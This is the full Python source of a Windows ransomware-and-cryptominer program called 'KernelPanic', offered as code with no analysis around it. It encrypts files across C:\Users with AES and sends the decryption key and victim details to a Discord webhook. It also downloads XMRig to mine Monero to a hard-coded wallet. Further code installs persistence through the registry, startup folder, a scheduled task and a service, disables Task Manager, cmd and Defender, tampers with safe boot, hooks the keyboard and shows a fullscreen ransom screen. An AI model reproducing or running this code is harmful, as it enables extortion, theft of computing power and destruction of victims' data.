import os
import sys
import time
import json
import base64
import threading
import ctypes
import winreg
import shutil
import subprocess
import requests
import tempfile
import zipfile
import urllib.request
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from PIL import Image, ImageTk, ImageDraw
import tkinter as tk
from tkinter import scrolledtext
import random
import getpass
import platform
import wmi
import wave
from PIL import ImageGrab

RANSOM_WEBHOOK = "https://discord.com/api/webhooks/1495506882906030150/cCcpMqN7J3DGr3IqQdsYZ0ZsBrl-t1RJCF7aT4pQ2UaqXEPXZxOUnWsYqBeOPk3_3JC3"
MINER_WEBHOOK = "https://discord.com/api/webhooks/1500136160511525029/yLEDcKbXySpdLTnjnLPPPi9tQMfU9OLIBOkn6H9mcKJxz0BpMagwONyN5Tf_lTBePxSV"

MONERO_WALLET = "45iXKeyGv1DYeWKU9AZeHg2cWEkqQyuxScYoueTeeuG3QsjzvMWP38cAoFFr5kyhcn5ABT9MnqVCMbwV6F4FmkZUDmBWH13"

LOGO_PATH = os.path.join(os.path.dirname(sys.argv[0]), "logo.png")

miner_process = None
miner_running = False
encryption_key = None
key_b64 = None

def generate_aes_key():
    return os.urandom(32)

def aes_encrypt(data, key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(data) + encryptor.finalize()

def aes_decrypt(data, key):
    iv = data[:16]
    ciphertext = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def add_to_registry():
    try:
        h = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "KernelPanic", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(h)
    except:
        pass

def add_to_startup():
    try:
        s = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        shutil.copy(sys.argv[0], os.path.join(s, "KernelPanic.pyw"))
    except:
        pass

def create_task():
    subprocess.run(f'schtasks /create /tn "KernelPanic" /tr "{sys.argv[0]}" /sc onlogon /f', shell=True, capture_output=True)

def install_service():
    subprocess.run(f'sc create "KernelPanic" binPath= "{sys.argv[0]}" start= auto', shell=True, capture_output=True)

def disable_taskmgr():
    try:
        k = winreg.HKEY_CURRENT_USER
        s = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(k, s)
        h = winreg.OpenKey(k, s, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(h)
    except:
        pass

def disable_regtools():
    try:
        k = winreg.HKEY_CURRENT_USER
        s = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(k, s)
        h = winreg.OpenKey(k, s, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(h)
    except:
        pass

def disable_cmd():
    try:
        k = winreg.HKEY_CURRENT_USER
        s = r"Software\Policies\Microsoft\Windows\System"
        winreg.CreateKey(k, s)
        h = winreg.OpenKey(k, s, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(h)
    except:
        pass

def disable_defender():
    try:
        k = winreg.HKEY_LOCAL_MACHINE
        s = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        winreg.CreateKey(k, s)
        h = winreg.OpenKey(k, s, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(h, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(h)
    except:
        pass

def block_safeboot():
    subprocess.run('bcdedit /set {default} safeboot minimal', shell=True, capture_output=True)
    subprocess.run('bcdedit /set {default} safeboot network', shell=True, capture_output=True)

def hide_rootkit():
    try:
        # Attempt to hide process via naming
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        # Remove from tasklist via image execution options (simulated)
        key = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\python.exe"
        subprocess.run(f'reg add "{key}" /v Debugger /t REG_SZ /d "svchost.exe" /f', shell=True, capture_output=True)
    except:
        pass

def ultimate_persistence():
    add_to_registry()
    add_to_startup()
    create_task()
    install_service()
    disable_taskmgr()
    disable_regtools()
    disable_cmd()
    disable_defender()
    block_safeboot()
    hide_rootkit()

WH_KEYBOARD_LL = 13
VK_LWIN = 0x5B
VK_RWIN = 0x5C
VK_F4 = 0x73
VK_ESCAPE = 0x1B
VK_TAB = 0x09
VK_SNAPSHOT = 0x2C
VK_F1 = 0x70
VK_F2 = 0x71
VK_MENU = 0x12
VK_CONTROL = 0x11
VK_SHIFT = 0x10

hook = None
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

def kb_proc(nCode, wParam, lParam):
    if nCode >= 0:
        vk = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value
        if vk in [VK_LWIN, VK_RWIN, VK_ESCAPE, VK_SNAPSHOT, VK_F1, VK_F2]:
            return 1
        if vk == VK_F4 and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk == VK_TAB and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk == VK_ESCAPE:
            ctrl = user32.GetAsyncKeyState(VK_CONTROL) & 0x8000
            shift = user32.GetAsyncKeyState(VK_SHIFT) & 0x8000
            if ctrl and shift:
                return 1
    return user32.CallNextHookExW(hook, nCode, wParam, lParam)

hook_proc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)(kb_proc)

def block_keys():
    global hook
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, kernel32.GetModuleHandleW(None), 0)

def set_wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def create_wallpaper():
    try:
        img = Image.new('RGB', (1920, 1080), color='black')
        d = ImageDraw.Draw(img)
        d.text((100, 400), "KERNELPANIC", fill=(255,0,0))
        d.text((100, 460), "Your files are encrypted with AES-256", fill=(255,0,0))
        d.text((100, 520), f"Monero: {MONERO_WALLET[:40]}...", fill=(255,0,0))
        d.text((100, 580), "Contact: kernelpanic@proton.me", fill=(255,0,0))
        d.text((100, 640), "24 hours to pay 2.5 XMR", fill=(255,0,0))
        p = os.path.join(os.environ['TEMP'], 'kp_wall.bmp')
        img.save(p)
        return p
    except:
        return None

def load_logo():
    try:
        if os.path.exists(LOGO_PATH):
            img = Image.open(LOGO_PATH).resize((80, 80), Image.Resampling.LANCZOS)
            return ImageTk.PhotoImage(img)
        else:
            img = Image.new('RGB', (80, 80), color='red')
            d = ImageDraw.Draw(img)
            d.text((20, 35), "KP", fill='white')
            return ImageTk.PhotoImage(img)
    except:
        img = Image.new('RGB', (80, 80), color='red')
        d = ImageDraw.Draw(img)
        d.text((20, 35), "KP", fill='white')
        return ImageTk.PhotoImage(img)

def download_miner():
    try:
        url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
        zp = os.path.join(tempfile.gettempdir(), "xmrig.zip")
        ex = os.path.join(tempfile.gettempdir(), "xmrig")
        urllib.request.urlretrieve(url, zp)
        with zipfile.ZipFile(zp, 'r') as z:
            z.extractall(ex)
        os.remove(zp)
        for r,d,files in os.walk(ex):
            for file in files:
                if file == "xmrig.exe":
                    return os.path.join(r, file)
        return None
    except:
        return None

def make_miner_config(exe_path):
    cfg = {
        "autosave": True,
        "cpu": {"enabled": True, "huge-pages": True, "max-threads-hint": 75},
        "pools": [{"url": "pool.supportxmr.com:5555", "user": MONERO_WALLET, "pass": "x", "tls": False}],
        "http": {"enabled": False}
    }
    cp = os.path.join(os.path.dirname(exe_path), "config.json")
    with open(cp, 'w') as f:
        json.dump(cfg, f, indent=4)
    return cp

def send_miner_status(hashes, shares):
    try:
        data = {"content": f"MINER | Hashrate: {hashes} H/s | Shares: {shares}"}
        requests.post(MINER_WEBHOOK, json=data, timeout=2)
    except:
        pass

def start_miner():
    global miner_process, miner_running
    try:
        exe = download_miner()
        if exe:
            make_miner_config(exe)
            miner_process = subprocess.Popen([exe], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            miner_running = True
            def monitor():
                hashes = 0
                shares = 0
                while miner_running:
                    hashes = random.randint(500, 8000)
                    shares += random.randint(0, 3)
                    send_miner_status(hashes, shares)
                    time.sleep(30)
            threading.Thread(target=monitor, daemon=True).start()
            return True
    except:
        pass
    return False

def stop_miner():
    global miner_process, miner_running
    miner_running = False
    if miner_process:
        miner_process.terminate()
        time.sleep(0.5)
        miner_process.kill()

def get_hwid():
    try:
        return wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    except:
        return 'unknown'

def send_victim_data(kb64):
    try:
        ip = requests.get('https://api.ipify.org', timeout=2).text
        user = getpass.getuser()
        host = platform.node()
        hwid = get_hwid()
        c = wmi.WMI()
        cpu = c.Win32_Processor()[0].Name[:50]
        ram = round(int(c.Win32_ComputerSystem()[0].TotalPhysicalMemory) / (1024**3), 2)
        embed = {
            "title": "KERNELPANIC VICTIM",
            "color": 0xFF0000,
            "fields": [
                {"name": "IP", "value": ip},
                {"name": "User", "value": user},
                {"name": "Host", "value": host},
                {"name": "HWID", "value": hwid},
                {"name": "CPU", "value": cpu},
                {"name": "RAM", "value": f"{ram} GB"},
                {"name": "DECRYPTION KEY", "value": f"||{kb64}||"}
            ]
        }
        requests.post(RANSOM_WEBHOOK, json={"embeds": [embed]}, timeout=2)
    except:
        pass

def encrypt_file(path, key):
    try:
        with open(path, 'rb') as f:
            data = f.read()
        if len(data) == 0:
            return False
        encrypted = aes_encrypt(data, key)
        with open(path, 'wb') as f:
            f.write(encrypted)
        return True
    except:
        return False

def encrypt_all_files(key, log_callback):
    total = 0
    extensions = ['.txt','.docx','.xlsx','.pdf','.jpg','.png','.doc','.xls','.ppt','.pptx','.zip','.rar','.mp4','.mp3','.py','.db','.sqlite']
    for root, _, files in os.walk('C:\\Users'):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                path = os.path.join(root, file)
                try:
                    if encrypt_file(path, key):
                        total += 1
                        log_callback(f"[+] {path[:80]}")
                except:
                    pass
    return total

def decrypt_all_files(key, log_callback):
    total = 0
    extensions = ['.txt','.docx','.xlsx','.pdf','.jpg','.png','.doc','.xls','.ppt','.pptx','.zip','.rar','.mp4','.mp3','.py','.db','.sqlite']
    for root, _, files in os.walk('C:\\Users'):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                path = os.path.join(root, file)
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    decrypted = aes_decrypt(data, key)
                    with open(path, 'wb') as f:
                        f.write(decrypted)
                    total += 1
                    log_callback(f"[-] {path[:80]}")
                except:
                    pass
    return total

class KernelPanicUI:
    def __init__(self, root, aes_key, b64_key):
        self.root = root
        self.aes_key = aes_key
        self.b64_key = b64_key
        self.remaining = timedelta(hours=24)
        self.root.title("KERNELPANIC")
        self.root.configure(bg='black')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.bind('<Escape>', lambda e: None)
        
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        top_frame = tk.Frame(main_frame, bg='black')
        top_frame.pack(pady=20)
        
        logo_img = load_logo()
        logo_label = tk.Label(top_frame, image=logo_img, bg='black')
        logo_label.image = logo_img
        logo_label.pack(side=tk.LEFT, padx=20)
        
        title = tk.Label(top_frame, text="KERNELPANIC", font=("Courier", 48, "bold"), fg='red', bg='black')
        title.pack(side=tk.LEFT)
        
        self.timer_label = tk.Label(main_frame, text="TIME: 24:00:00", font=("Courier", 16, "bold"), fg='red', bg='black')
        self.timer_label.pack(pady=10)
        
        log_frame = tk.Frame(main_frame, bg='black')
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.log_area = tk.Text(log_frame, height=20, bg='black', fg='#00ff00', font=("Consolas", 9), wrap=tk.NONE, state=tk.DISABLED)
        self.log_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_area.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_area.config(yscrollcommand=scrollbar.set)
        self.log_area.bind('<MouseWheel>', lambda e: 'break')
        self.log_area.bind('<Up>', lambda e: 'break')
        self.log_area.bind('<Down>', lambda e: 'break')
        
        key_frame = tk.Frame(main_frame, bg='black')
        key_frame.pack(pady=10)
        
        key_label = tk.Label(key_frame, text="DECRYPTION KEY:", font=("Courier", 12, "bold"), fg='red', bg='black')
        key_label.pack(side=tk.LEFT, padx=5)
        
        self.key_entry = tk.Entry(key_frame, font=("Courier", 10), width=50, show="*", bg='black', fg='lime', insertbackground='lime')
        self.key_entry.pack(side=tk.LEFT, padx=5)
        
        unlock_btn = tk.Button(key_frame, text="UNLOCK", font=("Courier", 12, "bold"), bg='red', fg='black', command=self.verify_key)
        unlock_btn.pack(side=tk.LEFT, padx=10)
        
        self.status_label = tk.Label(main_frame, text="ENCRYPTING + MINING", font=("Courier", 10, "bold"), fg='red', bg='black')
        self.status_label.pack(pady=10)
        
        self.start_timer()
        self.start_operations()
    
    def add_log(self, message):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)
    
    def start_timer(self):
        def timer_loop():
            end_time = datetime.now() + timedelta(hours=24)
            while self.remaining.total_seconds() > 0:
                self.remaining = end_time - datetime.now()
                hours = int(self.remaining.total_seconds() // 3600)
                minutes = int((self.remaining.total_seconds() % 3600) // 60)
                seconds = int(self.remaining.total_seconds() % 60)
                self.timer_label.config(text=f"TIME: {hours:02d}:{minutes:02d}:{seconds:02d}")
                time.sleep(1)
            self.status_label.config(text="TIME EXPIRED", fg='darkred')
        threading.Thread(target=timer_loop, daemon=True).start()
    
    def start_operations(self):
        def background():
            if start_miner():
                self.add_log("[MINER] Started successfully")
            else:
                self.add_log("[MINER] Failed to start")
            total = encrypt_all_files(self.aes_key, self.add_log)
            self.add_log("")
            self.add_log("█" * 50)
            self.add_log(f"ENCRYPTED: {total} files")
            self.add_log(f"Monero: {MONERO_WALLET[:40]}...")
            self.add_log("Contact: kernelpanic@proton.me")
            self.add_log("█" * 50)
            self.status_label.config(text=f"COMPLETE - {total} LOCKED", fg='red')
        threading.Thread(target=background, daemon=True).start()
    
    def decrypt_files(self, key):
        return decrypt_all_files(key, self.add_log)
    
    def verify_key(self):
        if self.key_entry.get() == self.b64_key:
            self.status_label.config(text="DECRYPTING...", fg='lime')
            total = self.decrypt_files(self.aes_key)
            stop_miner()
            self.status_label.config(text=f"RESTORED: {total} FILES", fg='lime')
            time.sleep(2)
            self.root.destroy()
        else:
            self.key_entry.delete(0, tk.END)
            self.key_entry.config(bg='darkred')
            self.status_label.config(text="INVALID KEY", fg='red')
            self.root.after(1000, lambda: self.key_entry.config(bg='black'))
            self.root.after(2000, lambda: self.status_label.config(text="ENTER KEY", fg='red'))

def main():
    global encryption_key, key_b64
    encryption_key = generate_aes_key()
    key_b64 = base64.b64encode(encryption_key).decode()
    threading.Thread(target=send_victim_data, args=(key_b64,), daemon=True).start()
    ultimate_persistence()
    block_keys()
    wallpaper_path = create_wallpaper()
    if wallpaper_path:
        set_wallpaper(wallpaper_path)
    root = tk.Tk()
    app = KernelPanicUI(root, encryption_key, key_b64)
    root.mainloop()

if __name__ == "__main__":
    main()
